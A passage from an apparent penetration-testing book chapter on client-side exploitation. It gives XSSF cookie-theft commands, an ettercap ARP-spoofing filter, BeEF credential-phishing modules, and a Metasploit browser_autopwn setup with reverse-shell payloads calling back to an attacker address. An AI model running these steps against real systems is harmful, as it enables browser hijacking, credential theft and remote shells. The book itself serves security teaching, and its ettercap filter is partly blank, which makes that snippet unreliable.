° Generic XSS injection: This is the target that you are attempting
to get the victim to click on or execute.
[ 294 ]
Chapter 11
° XSSF test page: XSSF provides access to a local test page that is
susceptible to XSS attacks. This can be used to validate attacks and
results before launching the attacks during actual testing.
° XSSF Tunnel Proxy: XSSF allows an attacker to surf using the
identity of a compromised host while retaining their security identity.
° XSSF logs page: This logs attacks and the information received.
Unfortunately, the log page provides a very dark background, and it
is difficult to see the returned information. During testing, we usually
access log information via the command line, which is cleaner and
can be scripted.
° XSSF statistics page.
° XSSF help page.
We'll use the vulnerable web application, Mutillidae, to demonstrate that
the XSSF. Mutillidae is part of the Metasploitable project, which can be
downloaded from http://sourceforge.net/projects/metasploitable/
files/Metasploitable2/. Refer to Appendix, Installing Kali Linux for notes
on installing this vulnerable target.
6. Once Mutillidae is opened, navigate to the blog page; this page is known
to be vulnerable to XSS (you can use a vulnerability scanning tool against
Mutillidae to identify other potential insertion points).
To launch the attack against the target client, do not enter a regular posting
into the blog. Instead, enter script elements that contain the the target URL
and port:
The following screenshot shows the placement of the attack code on the
target website's blog page.
[ 295 ]
Client-side Exploitation
When this is entered and the victim clicks on Save Blog Entry, their
system will be compromised. From the Metasploit Framework console,
the tester can get information about each victim using the xssf_victims
and xssf_information commands. On executing the xssf_victims
command, information about each victim is displayed, as shown in the
following screenshot:
The most common XSS attack at this point is to send a brief and relatively innocuous
message or alert to the client. Using the Metasploit Framework, this can be achieved
relatively simply by entering the following commands:
msf > use auxiliary/xssf/public/misc/alert
msf auxiliary(alert) > show options
After reviewing the options, an alert can be rapidly sent from the command line,
as shown in the following screenshot:
[ 296 ]
Chapter 11
The victim will see a message, as shown in the following screenshot:
Generally, most testers and their clients validate cross-site scripting using such
simple alert messages. These prove that a "vulnerability" exists.
However, simple alerts lack emotional impact. Frequently, they identify a real
vulnerability, but the client does not respond and mediate the vulnerability because
alert messages are not perceived to be a significant threat. Fortunately, XSSF allows
testers to "up the ante" and demonstrate more sophisticated and dangerous attacks.
XSSF can be used to steal cookies by using the following commands:
msf> use auxiliary/xssf/public/misc/cookie
msfauxillary(cookie) > show options
(ensure all needed options selected)
msfauxillary(cookie) > run
[ 297 ]
Client-side Exploitation
The execution of the run command is shown in the following screenshot:
When the attack has been completed, the cookie can be found by reviewing the results
on the XSSF logs page or directly from the command line using the command, as
shown in the following screenshot:
Some other useful commands in auxiliary/xssf/public/misc include:
• check_connected: This command checks whether the victim has opened
any social networking sites (Gmail, Facebook, or Twitter)
• csrf: It launches a cross-site request forgery attack
• keylogger: This command invokes a keylogger on the client side
• load_applet and load_pdf: These commands load hostile Java applets
and PDF files on the client side and invoke them to launch preconfigured
malicious software
• redirect: It redirects the client to a specified web page
• webcam_capture: This command captures images from the client's webcam
This is an incomplete list, but it shows the extent to which the tool has been
developed. Also, there are some modules for network scanning and launching
a denial-of-service attack, as well as some modules to ensure persistence after
an attack has been completed.
XSSF can also be used with ettercap to compromise an internal network. For
example, ettercap can be used to replace the  data with a link to the
malicious page by placing the following code in a filter named attack:
if (ip.proto == TCP && tcp.src == 80) {
if (search(DATA.data, "")) {
[ 298 ]
Chapter 11
replace("", " ");
}
}
The filter script must then be converted into a binary file using the following command:
etterfilter attack.filter –o attack.ef
To launch this attack against all of the users on a network, execute ettercap with the
following command:
ettercap –T –q –F attack.ef –M ARP // //
XSSF, especially when integrated into the Metasploit Framework, is a very powerful
tool for exploiting XSS vulnerabilities. However, a new star has recently emerged
that can help you to achieve similar attacks: the Browser Exploitation Framework.
The Brower Exploitation Framework –
BeEF
BeEF is an exploitation tool that focuses on a specific client-side application: the
web browser.
BeEF allows an attacker to inject a JavaScript code into a vulnerable HTML code
using an attack such as XSS or SQL injection. This exploit code is known as hook.
A compromise is achieved when the hook is executed by the browser. The browser
(zombie) connects back to the BeEF application, which serves JavaScript commands
or modules to the browser.
BeEF's modules perform tasks such as the following:
• Fingerprinting and the reconnaissance of compromised browsers. It can also
be used as a platform to assess the presence of exploits and their behavior
under different browsers.
Note that BeEF allows us to hook multiple browsers on the same
client, as well as multiple clients across a domain, and then manage
them during the exploitation and post-exploitation phases.
• Fingerprinting the target host, including the presence of virtual machines.
[ 299 ]
Client-side Exploitation
• Detecting software on the client (Internet Explorer only) and obtaining a
list of the directories in the Program Files and Program Files (x86)
directories. This may identify other applications that can be exploited to
consolidate our hold on the client.
• Taking photos using the compromised system's webcam; these photos have
a significant impact in reports.
• Conducting searches of the victim's data files and stealing data that may
contain authentication credentials (clipboard content and browser cookies)
or other useful information.
• Implementing browser keystroke logging.
• Conducting network reconnaissance using ping sweeps and fingerprint
network appliances and scanning for open ports.
• Launching attacks from the Metasploit Framework.
• Using the tunneling proxy extension to attack the internal network using
the security authority of the compromised web browser.
Because BeEF is written in Ruby, it supports multiple operating systems (Linux,
Windows, and OS X). More importantly, it is easy to customize new modules in
BeEF and extend its functionality.
Installing and configuring the Browser
Exploitation Framework
BeEF is not a part of the Kali distribution, however, it has been packaged with
required dependencies to support automated installation in Kali. To install BeEF, use
the following command:
root@kali:~# apt-get install beef-xss
BeEF will be installed in the /usr/share/beef-xss directory. By default, it is not
integrated with the Metasploit Framework. To integrate BeEF, you will need to
perform the following steps:
1. Edit the main configuration file located at /usr/share/beef-xss/
config.yaml to read:
metasploit:
enable:true
[ 300 ]
Chapter 11
2. Edit the file located at /usr/share/beef-xss/extensions/metasploit/
config.yml. You need to edit the lines host, callback_host, and os
'custom', path to include your IP address and the location for the
Metasploit Framework A correctly edited config.yml file is shown in the
following screenshot:
3. Start msfconsole, and load the msgrpc module, as shown in the following
screenshot. Make sure that you include the password as well:
4. Start BeEF using the following commands:
root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss/~# ./beef
[ 301 ]
Client-side Exploitation
5. Confirm startup by reviewing the messages generated during program
launch. They should indicate that Successful connection with Metasploit
occurred, which will be accompanied with an indication that Metasploit
exploits have been loaded. A successful program launch is shown in the
following screenshot:
When you restart BeEF, use the -x switch to reset the database.
In this example, the BeEF server is running on 192.168.222.129 and the "hook URL"
(the one that we want the target to activate) is 192.168.222.129:80/hook.js.
Most of the administration and management of BeEF is done via the web interface.
To access the control panel, go to http://:3000/ui/panel.
The default login credentials are Username:beef and Password:beef, as shown in
the following screenshot, unless these were changed in config.yaml.
[ 302 ]
Chapter 11
A walkthrough of the BeEF browser
When the BeEF control panel is launched, it will present the Getting Started
screen, featuring links to the online site as well as the demonstration pages that
can be used to validate the various attacks. The BeEF control panel is shown in
the following screenshot:
[ 303 ]
Client-side Exploitation
If you have hooked a victim, the interface will be divided into two panels:
• On the left-hand side of the panel, Hooked Browsers, the tester can see
every connected browser listed with information about its host operating
system, browser type, IP address, and installed plugins. Because BeEF sets a
cookie to identify victims, it can refer back to this information and maintain a
consistent list of victims.
• The right-hand side of the panel is where all of the actions are initiated and
the results are obtained. In the Commands tab, we see a categorized repository
of the different attack vectors that can be used against hooked browsers. This
view will differ based on the type and version of each browser.
BeEF uses a color-coding scheme to characterize the commands on the basis of their
usability against a particular target. The colors used are as follows:
• Green: This indicates that the command module works against the target
and should be detected by the victim
• Orange: This indicates that the command module works against the target,
but it may be detected by the victim
• Gray: This indicates that the command module is not yet verified against
the target
• Red: This indicates that the command module does not work against the
target. It can be used, but its success is not guaranteed, and its use may be
detected by the target
Take these indicators with a grain of salt since variations in the client environment
can make some commands ineffective, or may cause other unintended results.
To start an attack or hook a victim, we need to get the user to click on the hook URL,
which takes the form of :/hook.js. This can be achieved using
a variety of means, including:
• The original XSS vulnerabilities
• Man-in-the-middle attacks (especially, those using BeEF Shank, an ARP
spoofing tool that specifically targets intranet sites on internal networks)
• Social engineering attacks, including the BeEF web cloner and mass e-mailer,
custom hook point with iFrame impersonation, or the QR code generator
Once the browser has been hooked, it is referred to as a zombie. Select the IP address
of the zombie from the Hooked Browsers panel on the left-hand side of the command
interface and then refer to the available commands.
[ 304 ]
Chapter 11
In this example shown in the following screenshot, there are several different attacks
and management options available for the hooked browser. One of the easiest attack
options to use is the social engineering Clippy attack.
When Clippy is selected from the Module Tree under Commands, a specific Clippy
panel is launched on the far right, as shown in the following screenshot. It allows
you to adjust the image, the text delivered, and the executable that will be launched
locally if the victim clicks on the supplied link. By default, the custom text informs
the victim that their browser is out of date, offers to update it for them, downloads
an executable (non-malicious), and then thanks the user for performing the upgrade.
All of these options can be changed by the tester.
[ 305 ]
Client-side Exploitation
When Clippy is executed, the victim will see a message as shown in the following
screenshot on their browser:
This can be a very effective social engineering attack. When testing with clients,
we have had success rates (the client downloaded a non-malicious indicator file)
of approximately 70 percent.
The prompt module works in a similar manner. Instead of sending a simple alert
to the victim's browser, it sends a notification request prompting the victim to
enter data. In many cases, if the victim is prompted for undefined data, they will
automatically re-enter their password. The prompt can ask for specific data, or it can
be used to direct the victim to a website to download a system patch that contains
malware. The following screenshot shows one of the simplest, and most effective
attacks for obtaining a user's password.
[ 306 ]
Chapter 11
One of the more interesting attacks is Pretty Theft, which asks users for their
username and password for popular sites. For example, the Pretty Theft option for
Facebook can be configured by the tester, as shown in the following screenshot:
When the attack is executed, the victim is presented with a pop up that appears to be
legitimate, as shown in the following screenshot:
[ 307 ]
Client-side Exploitation
In BeEF, the tester reviews the history log for the attack and can derive the username
and password from the data field in the Command results column, as shown in the
following screenshot:
Integrating BeEF and Metasploit attacks
Both BeEF and the Metasploit Framework were developed using Ruby and can
operate together to exploit a target. Because it uses client-side and server-side
fingerprinting to characterize a target, browser_autopwn is one of the most
successful attacks.
Once the target has been hooked, start the Metasploit console and configure the
attack using the following commands:
msf > use auxiliary/server/browser_autopwn
msf auxiliary(browser_autopwn) > set LHOST 192.168.43.130
msf auxiliary(browser_autopwn) > set PAYLOAD_WIN32
windows/meterpreter/reverse_tcp
msf auxiliary(browser_autopwn) > set PAYLOAD_JAVA
java/meterpreter/reverse_tcp
msf auxiliary(browser_autopwn) > exploit
Wait until all of the relevant exploits have finished loading. In the example shown in
the following screenshot, 18 exploits are loaded. Note the target URL for the attack as
well. In this example, the target URL is http://192.168.43.130:8080/ICprp4Tnf4Z:
[ 308 ]
Chapter 11
There are several methods to direct a browser to click on a targeted URL, however,
if we have already hooked the target browser, we can use BeEF's redirect function.
In the BeEF control panel, go to Browser | Hooked Domain | Redirect Browser.
When prompted, use this module to point to the target URL and then execute
the attack.
In the Metasploit console, you will see the selected attacks being successively
launched against the target. A successful attack will open a Meterpreter session,
as shown in the following screenshot:
To see the list of open sessions with the compromised target, type sessions -l.
To interactively connect with a specific session, for example, session 1, type
sessions -i 1.
Using BeEF as a tunneling proxy
Tunneling is the process of encapsulating a payload protocol inside a delivery
protocol, such as IP. Using tunneling, you can transmit incompatible protocols
across a network, or you can bypass firewalls that are configured to block a
particular protocol. BeEF can be configured to act as a tunneling proxy that mimics
a reverse HTTP proxy: the browser session becomes the tunnel, and the hooked
browser is the exit point. This configuration is extremely useful when an internal
network has been compromised because the tunneling proxy can be used to:
• Browse authenticated sites in the security context (client-side SSL certificates,
authentication cookies, NTLM hashes, and so on) of the victim's browser
• Spider the hooked domain using the security context of the victim's browser
• Facilitate the use of tools such as SQL injection
[ 309 ]
Client-side Exploitation
To use the tunneling proxy, select the hooked browser that you wish to target and
right-click on its IP address. In the pop-up box, as shown in the following screenshot,
select the Use as Proxy option:
Configure a browser to use the BeEF tunneling proxy as an HTTP proxy. By default,
the address of the proxy is 127.0.0.1 and port is 6789.
If you visit a targeted website using the browser configured as the HTTP proxy, all
raw request/response pairs will be stored in the BeEF database, which can be
analyzed by navigating to Rider | History (an excerpt of the log is shown in
the following screenshot).
Once an attack has been completed, there are some mechanisms to ensure that a
persistent connection is retained, including:
• Confirm close: A module that presents the victim with a Confirm Navigation
- are you sure you want to leave this page pop up when they try to close
a tab. If the user elects to Leave this Page, it will not be effective, and the
Confirm Navigation pop up will continue to present itself.
• Pop-under module: This is configured to autorun in config.yaml. This
module attempts to open a small pop-under window to keep the browser
hooked if the victim closes the main browser tab. This may be blocked by
pop-up blockers.
[ 310 ]